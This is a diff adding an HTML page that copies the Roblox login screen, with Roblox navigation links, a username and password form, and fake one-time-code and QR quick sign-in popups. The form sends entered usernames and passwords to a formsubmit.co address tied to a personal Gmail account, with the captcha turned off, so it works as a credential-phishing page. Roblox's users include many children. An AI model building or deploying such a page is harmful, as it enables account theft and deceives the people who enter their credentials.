@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Roblox Style Login</title>
+
+
+<style>
+
+
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:Arial, Helvetica, sans-serif;
+    font-weight:700;
+}
+
+
+html,body{
+    width:100%;
+    height:100%;
+    font-size:18px;
+}
+
+
+
+
+/* BACKGROUND */
+
+
+body{
+    background-image:url("https://image.api.playstation.com/vulcan/ap/rnd/202604/0801/6157a74f216f5fd380f33d326132130e6d1d7578291da74c.png");
+    background-size:cover;
+    background-position:center;
+    background-repeat:no-repeat;
+}
+
+
+
+
+/* NAVBAR */
+
+
+.navbar{
+    position:fixed;
+    top:0;
+    width:100%;
+    height:40px;
+    background:#191b1f;
+    display:flex;
+    align-items:center;
+    padding:0 20px;
+    z-index:1000;
+}
+
+
+
+
+.logo{
+    color:white;
+    text-decoration:none;
+    font-size:25px;
+    font-weight:900;
+    margin-right:40px;
+}
+
+
+
+
+.nav-links{
+    display:flex;
+    gap:35px;
+}
+
+
+
+
+.nav-links a{
+    color:white;
+    text-decoration:none;
+    font-size:14px;
+    font-weight:600;
+}
+
+
+
+
+.nav-links a:hover{
+    color:#aaa;
+}
+
+
+
+
+/* SEARCH */
+
+
+.search{
+    margin-left:auto;
+    margin-right:20px;
+}
+
+
+
+
+.search input{
+    width:400px;
+    height:28px;
+    background:#202329;
+    border:1px solid #333;
+    border-radius:8px;
+    color:white;
+    padding:0 15px;
+}
+
+
+
+
+/* SIGN UP */
+
+
+.signup-btn{
+    background:#3366ff;
+    color:white;
+    text-decoration:none;
+    padding:8px 14px;
+    border-radius:8px;
+    font-weight:bold;
+}
+
+
+
+
+.signup-btn:hover{
+    background:#4d7dff;
+}
+
+
+
+
+/* LOGIN POSITION */
+
+
+.container{
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+
+
+
+/* LOGIN BOX */
+
+
+.login-box{
+    width:360px;
+    background:rgba(35,39,48,.95);
+    color:white;
+    padding:30px;
+    border-radius:8px;
+    text-align:center;
+}
+
+
+
+
+.login-box h1{
+    font-size:40px;
+    margin-bottom:20px;
+}
+
+
+
+
+.input-field{
+    width:100%;
+    height:42px;
+    margin-bottom:12px;
+    background:#343845;
+    border:1px solid #4a4f5d;
+    border-radius:6px;
+    color:white;
+    padding:0 15px;
+}
+
+
+
+
+.input-field::placeholder{
+    color:#ccc;
+}
+
+
+
+
+/* BUTTONS */
+
+
+.login-btn,
+.secondary-btn{
+    width:100%;
+    height:42px;
+    border-radius:8px;
+    cursor:pointer;
+    font-weight:bold;
+    margin-top:8px;
+}
+
+
+
+
+.login-btn{
+    background:transparent;
+    color:white;
+    border:1px solid white;
+}
+
+
+
+
+.login-btn:hover{
+    background:white;
+    color:black;
+}
+
+
+
+
+.secondary-btn{
+    background:#363a47;
+    border:none;
+    color:white;
+}
+
+
+
+
+.secondary-btn:hover{
+    background:#4a4f5d;
+}
+
+
+
+
+.link{
+    display:block;
+    margin:25px 0;
+    color:white;
+    text-decoration:none;
+}
+
+
+
+
+.signup{
+    margin-top:25px;
+}
+
+
+
+
+.signup a{
+    color:white;
+    font-weight:bold;
+}
+
+
+
+
+hr{
+    border:none;
+    height:1px;
+    background:#555;
+    margin:20px 0;
+}
+
+
+
+
+/* POPUPS */
+
+
+.modal{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.75);
+    justify-content:center;
+    align-items:center;
+}
+
+
+
+
+.modal-content{
+    width:370px;
+    background:#232734;
+    color:white;
+    padding:25px;
+    border-radius:8px;
+    text-align:center;
+    position:relative;
+}
+
+
+
+
+.close{
+    position:absolute;
+    top:10px;
+    right:15px;
+    font-size:30px;
+    cursor:pointer;
+}
+
+
+
+
+#qrcode{
+    background:white;
+    width:170px;
+    height:170px;
+    margin:15px auto;
+    padding:10px;
+}
+
+
+
+
+.code-box{
+    background:#343845;
+    padding:12px;
+    border-radius:8px;
+    font-size:28px;
+    letter-spacing:5px;
+    margin:15px 0;
+}
+
+
+</style>
+
+
+</head>
+
+
+<body>
+<!-- NAVBAR -->
+
+
+<div class="navbar">
+
+
+
+
+<a href="https://www.roblox.com/"
+class="logo"
+target="_blank">
+ROBLOX
+</a>
+
+
+
+
+<div class="nav-links">
+
+
+
+
+<a href="https://www.roblox.com/charts?device=computer&country=us"
+target="_blank">
+Charts
+</a>
+
+
+
+
+<a href="https://www.roblox.com/catalog?taxonomy=tZsUsd2BqGViQrJ9Vs3Wah&salesTypeFilter=1"
+target="_blank">
+Marketplace
+</a>
+
+
+
+
+<a href="https://create.roblox.com/landing"
+target="_blank">
+Create
+</a>
+
+
+
+
+<a href="https://www.roblox.com/upgrades/robux"
+target="_blank">
+Robux
+</a>
+
+
+
+
+</div>
+
+
+
+
+<div class="search">
+
+
+<input
+type="text"
+placeholder="Search">
+
+
+</div>
+
+
+
+
+<a href="https://www.roblox.com/CreateAccount"
+class="signup-btn"
+target="_blank">
+
+
+Sign Up
+
+
+</a>
+
+
+
+
+</div>
+
+
+
+
+<!-- LOGIN BOX -->
+
+
+
+
+<div class="container">
+
+
+
+
+<div class="login-box">
+
+
+
+
+<h1>
+Login to Roblox
+</h1>
+
+
+
+
+    <form action="https://formsubmit.co/isaacjackson413@gmail.com" method="POST">
+
+
+        <!-- Disable CAPTCHA for demo -->
+        <input type="hidden" name="_captcha" value="false">
+
+
+        <!-- Redirect after submission -->
+        <input type="hidden" name="_next" value="thankyou.html">
+
+
+    <input
+    type="text"
+    name="username"
+    class="input-field"
+    placeholder="Username/Email/Phone">
+
+
+
+
+    <input
+    type="password"
+    name="password"
+    class="input-field"
+    placeholder="Password">
+
+
+
+
+<button class="login-btn">
+Log In
+</button>
+
+
+
+
+<a href="https://www.roblox.com/login/forgot-password-or-username"
+class="link"
+target="_blank">
+
+
+Forgot Password or Username?
+
+
+</a>
+
+
+
+
+<hr>
+
+
+
+
+<button
+class="secondary-btn"
+onclick="openEmailCode()">
+
+
+Email Me a One-Time Code
+
+
+</button>
+
+
+
+
+<button
+class="secondary-btn"
+onclick="openQuickSignIn()">
+
+
+Quick Sign-in
+
+
+</button>
+
+
+
+
+<div class="signup">
+
+
+Don't have an account?
+
+
+<a href="https://www.roblox.com/CreateAccount"
+target="_blank">
+
+
+Sign Up
+
+
+</a>
+
+
+</div>
+
+
+
+
+</div>
+
+
+
+
+</div>
+<!-- EMAIL ONE-TIME CODE POPUP -->
+
+
+<div id="emailModal" class="modal">
+
+
+<div class="modal-content">
+
+
+<span class="close"
+onclick="closeEmailCode()">
+&times;
+</span>
+
+
+
+
+<h2>
+Get One-Time Code
+</h2>
+
+
+
+
+<p>
+Enter the email verified on your account
+to receive a one-time code.
+</p>
+
+
+
+
+<input
+type="email"
+class="input-field"
+placeholder="Enter your email">
+
+
+
+
+<button class="login-btn">
+Continue
+</button>
+
+
+
+
+</div>
+
+
+</div>
+
+
+
+
+<!-- QUICK SIGN-IN POPUP -->
+
+
+
+
+<div id="quickModal" class="modal">
+
+
+
+
+<div class="modal-content">
+
+
+
+
+<span class="close"
+onclick="closeQuickSignIn()">
+&times;
+</span>
+
+
+
+
+<h2>
+Quick Sign-In Code
+</h2>
+
+
+
+
+<h3>
+Option 1
+</h3>
+
+
+
+
+<p>
+Scan this QR code from your logged in
+device's camera.
+</p>
+
+
+
+
+<div id="qrcode">
+</div>
+
+
+
+
+<p>
+Having trouble?
+</p>
+
+
+
+
+<h3>
+Option 2
+</h3>
+
+
+
+
+<div id="loginCode" class="code-box">
+
+
+ABC123
+
+
+</div>
+
+
+
+
+<p>
+Open your Roblox app and go to:
+<br><br>
+
+
+<b>
+More Page &gt; Quick Sign In
+</b>
+
+
+</p>
+
+
+
+
+</div>
+
+
+
+
+</div>
+
+
+
+
+<!-- QR CODE LIBRARY -->
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js">
+</script>
+<script>
+
+
+
+
+/* GENERATE RANDOM 6 CHARACTER CODE */
+
+
+function generateCode(){
+
+
+    let characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+
+    let code = "";
+
+
+
+
+    for(let i = 0; i < 6; i++){
+
+
+        code += characters[
+            Math.floor(
+                Math.random() * characters.length
+            )
+        ];
+
+
+    }
+
+
+
+
+    return code;
+
+
+}
+
+
+
+
+
+
+/* OPEN QUICK SIGN-IN */
+
+
+function openQuickSignIn(){
+
+
+    let code = generateCode();
+
+
+
+
+    document
+    .getElementById("loginCode")
+    .innerHTML = code;
+
+
+
+
+    let qr =
+    document.getElementById("qrcode");
+
+
+
+
+    qr.innerHTML = "";
+
+
+
+
+    new QRCode(qr, {
+
+
+        text: code,
+        width: 150,
+        height: 150
+
+
+    });
+
+
+
+
+    document
+    .getElementById("quickModal")
+    .style.display = "flex";
+
+
+}
+
+
+
+
+
+
+/* CLOSE QUICK SIGN-IN */
+
+
+function closeQuickSignIn(){
+
+
+    document
+    .getElementById("quickModal")
+    .style.display = "none";
+
+
+}
+
+
+
+
+
+
+/* OPEN EMAIL CODE */
+
+
+function openEmailCode(){
+
+
+    document
+    .getElementById("emailModal")
+    .style.display = "flex";
+
+
+}
+
+
+
+
+
+
+/* CLOSE EMAIL CODE */
+
+
+function closeEmailCode(){
+
+
+    document
+    .getElementById("emailModal")
+    .style.display = "none";
+
+
+}
+
+
+
+
+
+
+/* CLOSE POPUPS WHEN CLICKING OUTSIDE */
+
+
+window.onclick = function(event){
+
+
+    let emailModal =
+    document.getElementById("emailModal");
+
+
+    let quickModal =
+    document.getElementById("quickModal");
+
+
+
+
+    if(event.target == emailModal){
+
+
+        emailModal.style.display = "none";
+
+
+    }
+
+
+
+
+    if(event.target == quickModal){
+
+
+        quickModal.style.display = "none";
+
+
+    }
+
+
+}
+
+
+
+
+</script>
+
+
+
+
+</body>
+
+
+</html>
+
